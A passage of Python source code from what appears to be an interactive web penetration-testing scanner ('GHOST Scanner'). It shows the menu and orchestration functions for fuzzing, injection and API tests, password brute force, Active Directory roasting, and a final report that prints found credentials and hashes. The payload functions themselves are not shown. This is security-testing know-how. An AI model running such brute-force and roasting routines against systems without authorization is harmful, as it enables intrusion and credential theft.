        use_ffuf = False
        print_warning("ffuf is not installed. Using internal method.")
    default_threads = max(THREADS, 50)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Threads [{default_threads}]:")
    t_in = input("> ").strip()
    try:
        vhost_threads = int(t_in) if t_in else default_threads
        if vhost_threads < 1:
            vhost_threads = default_threads
    except ValueError:
        vhost_threads = default_threads
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Timeout per request in seconds [5]:")
    timeout_in = input("> ").strip()
    try:
        req_timeout = int(timeout_in) if timeout_in else 5
        if req_timeout < 1:
            req_timeout = 5
    except ValueError:
        req_timeout = 5
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Add filter by detected File Size (-fs in ffuf)? [Y/n]:")
    use_fs = input("> ").strip().lower()
    use_fs_bool = (use_fs != 'n')

    hits = vhost_bruteforce(target, session, base_domain,
                            wordlist=wordlist, threads=vhost_threads,
                            request_timeout=req_timeout,
                            use_ffuf=use_ffuf, use_fs_filter=use_fs_bool) or []
    SCAN_DATA["vhosts"] = hits

def run_directory_fuzzing(target, session):
    print_phase("DIRECTORY FUZZING")
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use default wordlist (raft-small-directories)? [Y/n]:")
    use_default = input("> ").strip().lower()
    wordlist = None
    if use_default == 'n':
        custom_wl = input_path("Path to custom wordlist: ").strip()
        if custom_wl:
            wordlist = custom_wl
        else:
            print_warning("No wordlist provided. Using internal list.")
    if check_ffuf():
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use ffuf for fuzzing? (recommended) [Y/n]:")
        use_ffuf = input("> ").strip().lower() != 'n'
    else:
        use_ffuf = False
        print_warning("ffuf is not installed. Using internal method.")
    hits = dir_bruteforce(target, session, wordlist=wordlist, threads=THREADS, use_ffuf=use_ffuf) or []
    SCAN_DATA["directory_hits"] = hits

def run_injection_tests(target, session):
    print_phase("ADVANCED INJECTION TESTS")
    try:
        forms, url_params = safe_execute(extract_forms_and_params, target, session)
        SCAN_DATA["injection"] = {
            "executed": True,
            "forms_found": len(forms or []),
            "url_params_found": len(url_params or []),
            "tested_get_params": [],
            "tested_form_inputs": [],
            "forms": list(forms or []),
        }
        if not forms and not url_params:
            print_warning("No parameters or forms found to test.")
            return
        if url_params:
            print_info(f"Testing {len(url_params)} GET parameters...")
            for param in url_params:
                if advanced_injection_tests(target, param, session, 'GET'):
                    SCAN_DATA["injection"]["tested_get_params"].append(param)
                    continue
                if test_path_traversal(target, param, session, 'GET'):
                    SCAN_DATA["injection"]["tested_get_params"].append(param)
                    continue
                if test_open_redirect(target, param, session, 'GET'):
                    SCAN_DATA["injection"]["tested_get_params"].append(param)
                    continue
                SCAN_DATA["injection"]["tested_get_params"].append(param)
        if forms:
            print_info(f"Testing {len(forms)} forms...")
            for form in forms:
                action = form['action']
                method = form['method']
                inputs = form['inputs']
                page_url = form.get('page_url', target)
                form_url = urljoin(page_url, action) if action else page_url
                for inp in inputs:
                    SCAN_DATA["injection"]["tested_form_inputs"].append({
                        "url": form_url,
                        "method": method,
                        "input": inp,
                    })
                    if method == 'POST':
                        if advanced_injection_tests(form_url, inp, session, 'POST'):
                            continue
                        if test_path_traversal(form_url, inp, session, 'POST'):
                            continue
                        if test_open_redirect(form_url, inp, session, 'POST'):
                            continue
                    else:
                        if advanced_injection_tests(form_url, inp, session, 'GET'):
                            continue
                        if test_path_traversal(form_url, inp, session, 'GET'):
                            continue
                        if test_open_redirect(form_url, inp, session, 'GET'):
                            continue
    except KeyboardInterrupt:
        print_warning("Injection tests interrupted by user.")
        return

def run_api_tests(target, session):
    print_phase("API TESTS (OWASP API Top 10)")
    print_info("[1/7] Endpoint discovery...")
    found = safe_execute(discover_api_endpoints, target, session) or []
    SCAN_DATA["api_endpoints"] = found
    print_info("[2/7] Advanced CORS...")
    safe_execute(test_cors_advanced, target, session)
    print_info("[3/7] GraphQL introspection...")
    safe_execute(test_graphql, target, session)
    print_info("[4/7] JWT & authentication...")
    safe_execute(test_jwt_tokens, target, session)
    if found:
        print_info("[5/7] IDOR / BOLA...")
        safe_execute(test_api_idor, found, session)
        print_info("[6/7] Mass Assignment...")
        safe_execute(test_api_mass_assignment, found, session)
        print_info("[7/7] Errores verbose + Auth bypass...")
        safe_execute(test_api_verbose_errors, found, session)
        safe_execute(test_api_auth_bypass, found, session)
    else:
        print_info("[5-7/7] Skipping endpoint tests (none found).")
    safe_execute(test_api_rate_limiting, target, session)
    print_good("API tests completed.")

def run_user_enum_bruteforce(target, session):
    print_phase("USER ENUMERATION & BRUTEFORCE")
    users, emails = safe_execute(enumerate_users_from_endpoints, target, session) or ([], [])
    users = sorted(set(users or []))
    SCAN_DATA["users"] = users
    SCAN_DATA["emails"] = sorted(set(emails or []))
    if users:
        print_good(f"Users found: {', '.join(users)}")
    if emails:
        print_good(f"Emails found: {', '.join(emails)}")
    safe_execute(test_user_enumeration_form, target, session)
    wp_users = safe_execute(run_wpscan_user_enumeration_if_wordpress, target, session, users)
    if wp_users is not None:
        users = sorted(set(wp_users or []))
        SCAN_DATA["users"] = users
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Perform password brute force? (y/n):")
    want_brute = input("> ").strip().lower()
    if want_brute in ('', 's', 'y'):
        passlist = input_path("Path to password wordlist (leave empty to use SecLists default): ").strip()
        if not users:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter usernames separated by commas:")
            users_input = input("> ").strip()
            if users_input:
                users = [u.strip() for u in users_input.split(',') if u.strip()]
            else:
                users = ['admin', 'test']
        brute_data = safe_execute(bruteforce_login, target, session, users, passlist if passlist else None)
        if brute_data:
            SCAN_DATA["bruteforce_credentials"] = brute_data.get("credentials", [])

def run_spider(target, session):
    print_phase("SPIDERING / FULL SITE MAPPING")
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Maximum number of pages to crawl (default 500):")
    max_pages = input("> ").strip()
    if not max_pages:
        max_pages = 500
    else:
        max_pages = int(max_pages)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Maximum crawl depth (default 3):")
    max_depth = input("> ").strip()
    if not max_depth:
        max_depth = 3
    else:
        max_depth = int(max_depth)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Respect robots.txt? [Y/n]:")
    use_robots = input("> ").strip().lower() != 'n'
    urls, params, forms = spider_website(target, session, max_pages=max_pages, max_depth=max_depth, use_robots=use_robots)
    SCAN_DATA["spider"] = {
        "total_urls": len(urls),
        "total_params": len(params),
        "total_forms": len(forms),
        "sample_urls": sorted(list(urls)),
        "sample_params": sorted(list(params)),
        "sample_forms": list(forms),
    }
    print_good(f"Total URLs discovered: {len(urls)}")
    if params:
        print_info(f"Unique parameters found: {len(params)}")
    save = input("Save URL list to a file? (y/n): ").strip().lower()
    if save in ('s', 'y'):
        filename = input("File name (default: spider_output.txt): ").strip()
        if not filename:
            filename = "spider_output.txt"
        with open(filename, 'w') as f:
            for url in sorted(urls):
                f.write(url + '\n')
        print_good(f"URLs saved to {filename}")
    return urls

def run_source_code_analysis(target, session, urls=None):
    """Analyze the source code of accessible pages looking for credentials and exposed scripts.

    If `urls` is not provided, it tries to reuse the URLs sampled in SCAN_DATA["spider"];
    if none exist either, it offers to run a quick spider or analyze only the target.
    """
    print_phase("SOURCE CODE ANALYSIS")
    if urls is None:
        sample = (SCAN_DATA.get("spider") or {}).get("sample_urls") or []
        if sample:
            urls = list(sample)
            print_info(f"Using {len(urls)} URLs from the last spider.")
        else:
            try:
                ans = input(
                    f"{Fore.YELLOW}[?]{Style.RESET_ALL} No previous spider. "
                    f"Run a quick spider (max 50 pages)? [Y/n]: "
                ).strip().lower()
            except (KeyboardInterrupt, EOFError):
                ans = 'n'
            if ans != 'n':
                discovered, _params, _forms = spider_website(
                    target, session, max_pages=50, max_depth=2, use_robots=True
                )
                SCAN_DATA["spider"] = {
                    "total_urls": len(discovered),
                    "total_params": 0,
                    "total_forms": 0,
                    "sample_urls": sorted(list(discovered)),
                    "sample_params": [],
                    "sample_forms": [],
                }
                urls = list(discovered)
            else:
                print_warning("Analyzing only the target URL.")
                urls = [target]
    result = analyze_source_code(target, session, urls=urls)
    SCAN_DATA["source_code_analysis"] = result
    return result

def print_final_summary(target):
    """Print a final summary with all SCAN_DATA tables and FINDINGS.

    Invoked at the end of the full pentest to provide a consolidated view of all
    collected information before saving the report.
    """
    SEV_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}
    SEV_COLOR = {
        'critical': Fore.MAGENTA, 'high': Fore.RED, 'medium': Fore.YELLOW,
        'low': Fore.CYAN, 'info': Fore.WHITE, 'unknown': Fore.WHITE,
    }

    def _trim(value, width=80):
        text = str(value) if value is not None else "-"
        return text if len(text) <= width else text[: width - 3] + "..."

    def _stringify(item):
        """Convert an item (str/dict/other) into a readable string."""
        if isinstance(item, str):
            return item
        if isinstance(item, dict):
            name = item.get("name") or item.get("template_id") or item.get("url") or ""
            detail = item.get("detail") or item.get("value") or ""
            if name and detail:
                return f"{name} ({detail})"
            return name or detail or str(item)
        return str(item)

    def _join_safe(items, sep=", "):
        return sep.join(_stringify(i) for i in (items or []))

    def _count_label(total, limit):
        if total <= limit:
            return f"({total})"
        return f"(top {limit} of {total})"

    print_phase("FINAL PENTEST SUMMARY")

    general = SCAN_DATA.get("general") or {}
    nuclei_summary = SCAN_DATA.get("nuclei_summary") or {}
    nuclei_findings = SCAN_DATA.get("nuclei_findings") or []
    spider = SCAN_DATA.get("spider") or {}
    injection = SCAN_DATA.get("injection") or {}
    vhosts = SCAN_DATA.get("vhosts") or []
    dir_hits = SCAN_DATA.get("directory_hits") or []
    api_endpoints = SCAN_DATA.get("api_endpoints") or []
    users = SCAN_DATA.get("users") or []
    emails = SCAN_DATA.get("emails") or []
    creds = SCAN_DATA.get("bruteforce_credentials") or []
    wordpress = SCAN_DATA.get("wordpress") or {}
    robots_paths = SCAN_DATA.get("robots_paths") or []
    http_methods = SCAN_DATA.get("http_methods") or []
    src_code = SCAN_DATA.get("source_code_analysis") or {}
    src_findings = src_code.get("findings") or []
    nmap_data = SCAN_DATA.get("nmap") or {}
    nmap_ports = nmap_data.get("ports") or []
    nmap_nse = nmap_data.get("nse_results") or []
    active_directory = SCAN_DATA.get("active_directory") or {}
    ad_ldap = active_directory.get("ldap") or {}
    ad_imp = active_directory.get("impacket") or {}
    ad_nxc = active_directory.get("nxc") or {}
    asrep_hashes = (ad_imp.get("asrep_roast") or {}).get("hashes") or []
    kerberoast_hashes = (ad_imp.get("kerberoast") or {}).get("hashes") or []
    ad_creds = (ad_nxc.get("bruteforce") or {}).get("credentials") or []

    overview_rows = [
        ["Target", _trim(target, 90)],
        ["HTTP Status", str(general.get("status_code", "-"))],
        ["Server", _trim(general.get("server", "-"), 90)],
        ["Technologies", _trim(_join_safe(general.get("technologies", [])) or "-", 90)],
        ["Findings", str(len(FINDINGS))],
        ["Open ports (nmap)", str(len(nmap_ports))],
        ["Targeted NSE results", str(len(nmap_nse))],
        ["Nuclei vulnerabilities", str(len(nuclei_findings))],
        ["Spider URLs", str(spider.get("total_urls", 0))],
        ["Subdomains (vhosts)", str(len(vhosts))],
        ["Directories found", str(len(dir_hits))],
        ["API Endpoints", str(len(api_endpoints))],
        ["Users", str(len(users))],
        ["Emails", str(len(emails))],
        ["Valid credentials", str(len(creds))],
        ["WordPress vulnerabilities", str(len(wordpress.get("vulnerabilities") or []))],
        ["AD Users (LDAP)", str(len(ad_ldap.get("users") or []))],
        ["AS-REP roastable", str(len(asrep_hashes))],
        ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
        ["AD Credentials (NXC)", str(len(ad_creds))],
        ["Source code findings", str(len(src_findings))],
    ]
    print_table(
        headers=["Field", "Value"],
        rows=overview_rows,
        alignments=['<', '<'],
        title="Executive summary:",
    )

    sec_header_names = [
        "Strict-Transport-Security", "Content-Security-Policy",
        "X-Frame-Options", "X-Content-Type-Options",
        "Referrer-Policy", "Permissions-Policy",
    ]
    headers = (general.get("headers") or {})
    sec_rows = []
    for h in sec_header_names:
        v = headers.get(h) or headers.get(h.lower()) or "-"
        present = v != "-"
        mark = f"{Fore.GREEN}OK{Style.RESET_ALL}" if present else f"{Fore.RED}MISSING{Style.RESET_ALL}"
        sec_rows.append([h, mark, _trim(v, 80)])
    print_table(
        headers=["Header", "Status", "Value"],
        rows=sec_rows,
        alignments=['<', '<', '<'],
        title="Security headers:",
    )

    cookies = general.get("cookies") or []
    if cookies:
        cookie_rows = [[c] for c in cookies]
        print_table(
            headers=["Cookie"],
            rows=cookie_rows,
            alignments=['<'],
            title="Detected cookies:",
        )

    misc_rows = []
    if http_methods:
        misc_rows.append(["Allowed HTTP methods", _trim(_join_safe(http_methods), 90)])
    if robots_paths:
        misc_rows.append([f"robots.txt/sitemap paths ({len(robots_paths)})", _trim(_join_safe(robots_paths[:15]), 90)])
    if misc_rows:
        print_table(
            headers=["Category", "Value"],
            rows=misc_rows,
            alignments=['<', '<'],
            title="Additional HTTP information:",
        )

    if nmap_ports:
        STATE_COLOR = {"open": Fore.GREEN, "open|filtered": Fore.YELLOW}
        port_rows = []
        for p in nmap_ports[:50]:
            color = STATE_COLOR.get(p.get("state", ""), Fore.WHITE)
            version_parts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
            version_str = " ".join(v for v in version_parts if v).strip() or "-"
            port_rows.append([
                f"{p.get('port', '-')}/{p.get('protocol', '')}",
                f"{color}{p.get('state', '-')}{Style.RESET_ALL}",
                _trim(p.get("service", "") or "-", 24),
                _trim(version_str, 60),
            ])
        print_table(
            headers=["Port", "Status", "Service", "Version"],
            rows=port_rows,
            alignments=['<', '<', '<', '<'],
            title=f"Open ports (nmap) {_count_label(len(nmap_ports), len(port_rows))}:",
        )
    if nmap_nse:
        nse_rows = []
        for item in nmap_nse[:40]:
            color = Fore.RED if item.get("interesting") else Fore.CYAN
            output = (item.get("output") or "").splitlines()[0] if item.get("output") else "-"
            nse_rows.append([
                f"{item.get('port', '-')}/{item.get('protocol', '')}",
                _trim(item.get("service") or "-", 18),
                f"{color}{item.get('script_id', '-')}{Style.RESET_ALL}",
                _trim(output, 85),
            ])
        print_table(
            headers=["Port", "Service", "Script", "Output"],
            rows=nse_rows,
            alignments=['<', '<', '<', '<'],
            title=f"Targeted NSE results {_count_label(len(nmap_nse), len(nse_rows))}:",
        )

    if spider:
        spider_rows = [
            ["Total URLs", str(spider.get("total_urls", 0))],
            ["Unique parameters", str(spider.get("total_params", 0))],
            ["Forms", str(spider.get("total_forms", 0))],
        ]
        print_table(
            headers=["Metric", "Value"],
            rows=spider_rows,
            alignments=['<', '>'],
            title="Spidering:",
        )
        sample_urls = spider.get("sample_urls") or []
        if sample_urls:
            url_rows = [[_trim(u, 110)] for u in sample_urls[:20]]
            print_table(
                headers=["URL"],
                rows=url_rows,
                alignments=['<'],
                title=f"Muestra de URLs descubiertas {_count_label(spider.get('total_urls', 0), len(url_rows))}:",
            )

    if src_code:
        sev_stats = src_code.get("summary") or {}
        code_overview = [
            ["Pages analyzed", str(src_code.get("pages_analyzed", 0))],
            ["JS/JSON assets analyzed", str(src_code.get("assets_analyzed", 0))],
            ["Total findings", str(len(src_findings))],
            [f"{Fore.MAGENTA}Critical{Style.RESET_ALL}", str(sev_stats.get("critical", 0))],
            [f"{Fore.RED}High{Style.RESET_ALL}", str(sev_stats.get("high", 0))],
            [f"{Fore.YELLOW}Medium{Style.RESET_ALL}", str(sev_stats.get("medium", 0))],
            [f"{Fore.CYAN}Low{Style.RESET_ALL}", str(sev_stats.get("low", 0))],
        ]
        print_table(
            headers=["Metric", "Value"],
            rows=code_overview,
            alignments=['<', '>'],
            title="Source code analysis:",
        )
        if src_findings:
            sorted_src = sorted(
                src_findings,
                key=lambda x: SEV_ORDER.get(x.get("severity", "low"), 9),
            )
            code_rows = []
            for f in sorted_src[:30]:
                sev = f.get("severity", "low")
                color = SEV_COLOR.get(sev, Fore.WHITE)
                code_rows.append([
                    f"{color}{sev.upper()}{Style.RESET_ALL}",
                    _trim(f.get("type", "-"), 30),
                    _trim(f.get("value", "-"), 40),
                    _trim(f.get("url", "-"), 60),
                ])
            print_table(
                headers=["Severity", "Type", "Detected Value", "URL"],
                rows=code_rows,
                alignments=['<', '<', '<', '<'],
                title=f"Source code findings {_count_label(len(sorted_src), len(code_rows))}:",
            )

    if vhosts:
        vh_rows = []
        for v in vhosts[:30]:
            status = str(v.get("status", "-"))
            fqdn = _trim(v.get("fqdn") or v.get("subdomain", "-"), 80)
            size = str(v.get("size", "-"))
            sc = Fore.GREEN if status.startswith("2") else (Fore.YELLOW if status.startswith("3") else Fore.RED if status.startswith("4") else Fore.WHITE)
            vh_rows.append([f"{sc}{status}{Style.RESET_ALL}", fqdn, size])
        print_table(
            headers=["Status", "VHost", "Size"],
            rows=vh_rows,
            alignments=['<', '<', '>'],
            title=f"Subdomains found {_count_label(len(vhosts), len(vh_rows))}:",
        )

    if dir_hits:
        dir_rows = []
        for h in dir_hits[:30]:
            status = str(h.get("status", "-"))
            url = _trim(h.get("url", "-"), 90)
            size = str(h.get("size", "-"))
            sc = Fore.GREEN if status.startswith("2") else (Fore.YELLOW if status.startswith("3") else Fore.RED if status.startswith("4") else Fore.WHITE)
            dir_rows.append([f"{sc}{status}{Style.RESET_ALL}", url, size])
        print_table(
            headers=["Status", "URL", "Size"],
            rows=dir_rows,
            alignments=['<', '<', '>'],
            title=f"Directories found {_count_label(len(dir_hits), len(dir_rows))}:",
        )

    if wordpress:
        wp_version = wordpress.get("version") or {}
        wp_theme = wordpress.get("main_theme") or {}
        wp_users = wordpress.get("users") or []
        wp_vulns = wordpress.get("vulnerabilities") or []
        wp_rows = [
            ["Detected", "Yes" if wordpress.get("detected") else "Not confirmed"],
            ["Version", wp_version.get("number") or "-"],
            ["Status", wp_version.get("status") or "-"],
            ["Main theme", wp_theme.get("name") or "-"],
            ["Users", str(len(wp_users))],
            ["Vulnerabilities", str(len(wp_vulns))],
            ["Credentials", str(len(wordpress.get("credentials") or []))],
        ]
        print_table(
            headers=["Field", "Value"],
            rows=wp_rows,
            alignments=['<', '<'],
            title="WordPress / WPScan:",
        )
        if wp_vulns:
            vuln_rows = []
            for v in wp_vulns[:30]:
                vuln_rows.append([
                    _trim(v.get("component_type", "-"), 14),
                    _trim(v.get("component", "-"), 30),
                    _trim(v.get("title", "-"), 70),
                    _trim(v.get("fixed_in", "-"), 20),
                ])
            print_table(
                headers=["Type", "Component", "Title", "Fixed in"],
                rows=vuln_rows,
                alignments=['<', '<', '<', '<'],
                title=f"WordPress vulnerabilities {_count_label(len(wp_vulns), len(vuln_rows))}:",
            )

    if api_endpoints:
        api_rows = []
        for ep in api_endpoints[:30]:
            status = str(ep.get("status", "-"))
            endpoint = _trim(ep.get("endpoint") or ep.get("url", "-"), 60)
            ctype = _trim(ep.get("content_type", "-"), 30)
            api_rows.append([status, endpoint, ctype])
        print_table(
            headers=["Status", "Endpoint", "Content-Type"],
            rows=api_rows,
            alignments=['<', '<', '<'],
            title=f"Discovered API endpoints {_count_label(len(api_endpoints), len(api_rows))}:",
        )

    if users or emails:
        ue_rows = []
        if users:
            ue_rows.append(["Users", _trim(_join_safe(users), 100)])
        if emails:
            ue_rows.append(["Emails", _trim(_join_safe(emails), 100)])
        print_table(
            headers=["Category", "Values"],
            rows=ue_rows,
            alignments=['<', '<'],
            title="Discovered users & emails:",
        )

    if injection.get("executed"):
        inj_rows = [
            ["Forms detected", str(injection.get("forms_found", 0))],
            ["GET parameters detected", str(injection.get("url_params_found", 0))],
            ["GET parameters tested", str(len(injection.get("tested_get_params", [])))],
            ["Form inputs tested", str(len(injection.get("tested_form_inputs", [])))],
        ]
        print_table(
            headers=["Metric", "Value"],
            rows=inj_rows,
            alignments=['<', '>'],
            title="Injection tests:",
        )

    if creds:
        cred_rows = []
        for c in creds:
            user = c.get("username") if isinstance(c, dict) else str(c)
            pwd = c.get("password") if isinstance(c, dict) else "-"
            cred_rows.append([f"{Fore.GREEN}{user}{Style.RESET_ALL}", f"{Fore.GREEN}{pwd}{Style.RESET_ALL}"])
        print_table(
            headers=["User", "Password"],
            rows=cred_rows,
            alignments=['<', '<'],
            title="Valid credentials found:",
            border_color=Fore.GREEN,
        )

    if active_directory:
        ad_rows = [
            ["DC", _trim(active_directory.get("target") or "-", 60)],
            ["Domain", _trim(active_directory.get("domain") or "-", 60)],
            ["Mode", active_directory.get("auth_mode") or "-"],
            ["Kerbrute users", str(len((active_directory.get("kerbrute") or {}).get("valid_users") or []))],
            ["LDAP users", str(len(ad_ldap.get("users") or []))],
            ["LDAP groups", str(len(ad_ldap.get("groups") or []))],
            ["LDAP computers", str(len(ad_ldap.get("computers") or []))],
            ["AS-REP roastable", str(len(asrep_hashes))],
            ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
            ["NXC credentials", str(len(ad_creds))],
        ]
        print_table(
            headers=["Field", "Value"],
            rows=ad_rows,
            alignments=['<', '<'],
            title="Active Directory:",
        )
        if asrep_hashes:
            print_table(
                headers=["User", "Hash"],
                rows=[[_trim(h.get("username") or "-", 28), _trim(h.get("hash") or "-", 110)] for h in asrep_hashes[:20]],
                alignments=['<', '<'],
                title=f"AS-REP Roasting {_count_label(len(asrep_hashes), min(len(asrep_hashes), 20))}:",
            )
        if kerberoast_hashes:
            print_table(
                headers=["User/SPN", "Hash"],
                rows=[[_trim(h.get("username") or "-", 28), _trim(h.get("hash") or "-", 110)] for h in kerberoast_hashes[:20]],
                alignments=['<', '<'],
                title=f"Kerberoasting {_count_label(len(kerberoast_hashes), min(len(kerberoast_hashes), 20))}:",
            )

    if nuclei_summary:
        sum_rows = []
        for sev in sorted(nuclei_summary.keys(), key=lambda s: SEV_ORDER.get(s, 99)):
            tids = nuclei_summary[sev]
            color = SEV_COLOR.get(sev, Fore.WHITE)
            unique_str = _join_safe(sorted(set(tids)))
            sum_rows.append([
                f"{color}{sev.upper()}{Style.RESET_ALL}",
                str(len(tids)),
                _trim(unique_str, 100),
            ])
        print_table(
            headers=["Severity", "Count", "Unique Templates"],
            rows=sum_rows,
            alignments=['<', '>', '<'],
            title="Vulnerabilities by severity (Nuclei):",
        )

    relevant_nuclei = [n for n in nuclei_findings if n.get('severity') in ('critical', 'high', 'medium', 'low')]
    if relevant_nuclei:
        rel_rows = []
        for n in relevant_nuclei[:30]:
            sev = n.get('severity', 'info')
            color = SEV_COLOR.get(sev, Fore.WHITE)
            rel_rows.append([
                f"{color}{sev.upper()}{Style.RESET_ALL}",
                _trim(n.get('template_id', '-'), 40),
                _trim(n.get('name', '-'), 50),
                _trim(n.get('url', '-'), 60),
            ])
        print_table(
            headers=["Severity", "Template", "Name", "URL"],
            rows=rel_rows,
            alignments=['<', '<', '<', '<'],
            title=f"Relevant Nuclei findings {_count_label(len(relevant_nuclei), len(rel_rows))}:",
        )

    if FINDINGS:
        cats = {}
        for f in FINDINGS:
            m = re.match(r'^\[([^\]]+)\]', f)
            cat = m.group(1) if m else "OTHER"
            cats.setdefault(cat, []).append(f)
        cat_rows = []
        for cat in sorted(cats.keys()):
            cat_rows.append([cat, str(len(cats[cat]))])
        print_table(
            headers=["Category", "Count"],
            rows=cat_rows,
            alignments=['<', '>'],
            title=f"Classified findings (total: {len(FINDINGS)}):",
        )
        find_rows = []
        for f in FINDINGS[:40]:
            m = re.match(r'^\[([^\]]+)\]\s*(.*)', f)
            if m:
                cat = m.group(1)
                msg = m.group(2)
            else:
                cat, msg = "OTHER", f
            color = Fore.RED if cat.startswith(("VULN", "NUCLEI:CRITICAL", "NUCLEI:HIGH", "CRED", "WP:VULN")) else (
                Fore.YELLOW if cat.startswith(("NUCLEI:MEDIUM", "DIR", "VHOST", "WP")) else Fore.CYAN
            )
            find_rows.append([f"{color}{cat}{Style.RESET_ALL}", _trim(msg, 110)])
        print_table(
            headers=["Category", "Detail"],
            rows=find_rows,
            alignments=['<', '<'],
            title=f"Findings detail {_count_label(len(FINDINGS), len(find_rows))}:",
        )

    print()
    print_good("Summary complete. Use 'Save report' on exit to export TXT/JSON/HTML/MD.")


def run_full_pentest(target, session):
    print_phase("STARTING FULL PENTEST")
    run_information_gathering(target, session)
    safe_execute(run_nmap_scan, target, session)
    run_nuclei_scan(target, session)
    run_vhost_fuzzing(target, session)
    run_directory_fuzzing(target, session)
    spider_urls = run_spider(target, session)
    safe_execute(
        run_source_code_analysis,
        target, session,
        urls=list(spider_urls) if spider_urls else None,
    )
    run_injection_tests(target, session)
    run_api_tests(target, session)
    run_user_enum_bruteforce(target, session)
    run_wordpress_attacks_if_detected(target, session)
    try:
        run_ad = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run the Active Directory module? [y/N]: ").strip().lower() in ('s', 'y')
    except (KeyboardInterrupt, EOFError):
        run_ad = False
    if run_ad:
        safe_execute(run_active_directory_pentest, target)
    print_good("Full pentest completed.")
    print_final_summary(target)

def main():
    global TARGET_URL, AUTHENTICATED, AUTH_SESSION, THREADS, DEFAULT_TIMEOUT, REQUEST_DELAY, OUTPUT_FILE, VERIFY_TLS
    global USER_AGENT, HTTP_PROXIES, EXTRA_HEADERS, COOKIE_STRING

    parser = argparse.ArgumentParser(
        description=f"GHOST Scanner v{VERSION} — OWASP Web Security Testing Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python ghost-scanner.py --url https://example.com --output report.html"
    )
    parser.add_argument('--url', '-u', metavar='URL',
                        help='Target URL (omit for interactive mode)')
    parser.add_argument('--output', '-o', metavar='FILE',
                        help='Output file for report (e.g. report.html)')
    parser.add_argument('--threads', '-t', type=int, default=THREADS, metavar='N',
                        help=f'Number of threads (default: {THREADS})')
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT, metavar='S',
                        help=f'Request timeout in seconds (default: {DEFAULT_TIMEOUT})')
    parser.add_argument('--delay', '-d', type=float, default=0.0, metavar='S',
                        help='Delay between requests in seconds for evasion (default: 0)')
    parser.add_argument('--insecure', '-k', action='store_true',
                        help='Disable TLS certificate verification (for labs / test environments)')
    parser.add_argument('--cookie', metavar='STR',
                        help='Session cookie string sent on every request (e.g. "PHPSESSID=...; token=...")')
    parser.add_argument('--user-agent', '-A', metavar='UA',
                        help='Custom User-Agent for every request')
    parser.add_argument('--proxy', metavar='URL',
                        help='Route all traffic through a proxy, e.g. http://127.0.0.1:8080 (Burp/ZAP)')
    parser.add_argument('--header', '-H', action='append', metavar='"Name: value"', default=[],
                        help='Extra header on every request; repeatable (e.g. -H "Authorization: Bearer x")')
    parser.add_argument('--no-color', action='store_true',
                        help='Disable colored output')
    parser.add_argument('--version', '-V', action='version', version=f'GHOST Scanner v{VERSION}')
    args = parser.parse_args()

    THREADS = args.threads
    DEFAULT_TIMEOUT = args.timeout
    REQUEST_DELAY = args.delay
    OUTPUT_FILE = args.output
    VERIFY_TLS = not args.insecure
    USER_AGENT = args.user_agent
    COOKIE_STRING = (args.cookie or "").strip()
    if args.proxy:
        HTTP_PROXIES = {"http": args.proxy, "https": args.proxy}
    for raw in args.header:
        if ":" not in raw:
            print_warning(f"Ignoring malformed --header (expected 'Name: value'): {raw}")
            continue
        name, value = raw.split(":", 1)
        if name.strip():
            EXTRA_HEADERS[name.strip()] = value.strip()

    if args.no_color:
        global HAS_COLOR
        HAS_COLOR = False

    clear_screen()
    if HAS_COLOR:
        print(Fore.CYAN + BANNER + Style.RESET_ALL)
        print(Fore.CYAN + DESCRIPTION + Style.RESET_ALL)
        print(Fore.GREEN + DEVELOPER + Style.RESET_ALL + "\n")
    else:
        print(BANNER)
        print(DESCRIPTION)
        print(DEVELOPER + "\n")

    if not VERIFY_TLS:
        print_warning("TLS verification disabled (--insecure). For test environments only.")
    if HTTP_PROXIES:
        print_info(f"Routing traffic through proxy: {args.proxy}")
        if VERIFY_TLS:
            print_warning("Using a proxy with TLS verification on may fail; add --insecure for intercepting proxies.")
    if COOKIE_STRING:
        print_info("Session cookie supplied via --cookie (applied to all requests).")
    if EXTRA_HEADERS:
        print_info(f"Extra headers applied to all requests: {', '.join(EXTRA_HEADERS.keys())}")
    if USER_AGENT:
        print_info(f"Custom User-Agent: {USER_AGENT}")

    if args.url:
        TARGET_URL = normalize_url(args.url)
        print_info(f"Target: {TARGET_URL}")
    else:
        TARGET_URL = input("Enter target URL: ").strip()
        TARGET_URL = normalize_url(TARGET_URL)
        print_info(f"Target: {TARGET_URL}")

    session = get_session()

    def _exit_gracefully():
        """Close the program showing the report and the final message."""
        print()
        has_scan_data = _has_scan_data()
        if has_scan_data:
            auto_save = OUTPUT_FILE is not None
            if not auto_save:
                try:
                    auto_save = input(
                        f"\nSave scan report ({len(FINDINGS)} findings)? [Y/n]: "
                    ).strip().lower() != 'n'
                except (KeyboardInterrupt, EOFError):
                    auto_save = False
            if auto_save:
                save_report(OUTPUT_FILE)
        print("\n" + Fore.GREEN + "Happy Hacking :)" + Style.RESET_ALL)
        sys.exit(0)

    while True:
        try:
            show_menu()
            option = input("Select an option: ").strip()
        except (KeyboardInterrupt, EOFError):
            try:
                print()
                confirm = input("\nExit program? [Y/n]: ").strip().lower()
            except (KeyboardInterrupt, EOFError):
                confirm = 's'
            if confirm != 'n':
                _exit_gracefully()
            continue

        try:
            if option == '1':
                setup_authentication()
                if AUTHENTICATED:
                    session = AUTH_SESSION
                    print_good("Authenticated session active for future tests.")
                else:
                    print_warning("Could not authenticate. Continuing without authentication.")
            elif option == '2':
                run_information_gathering(TARGET_URL, session)
            elif option == '3':
                run_nmap_scan(TARGET_URL, session)
            elif option == '4':
                run_nuclei_scan(TARGET_URL, session)
            elif option == '5':
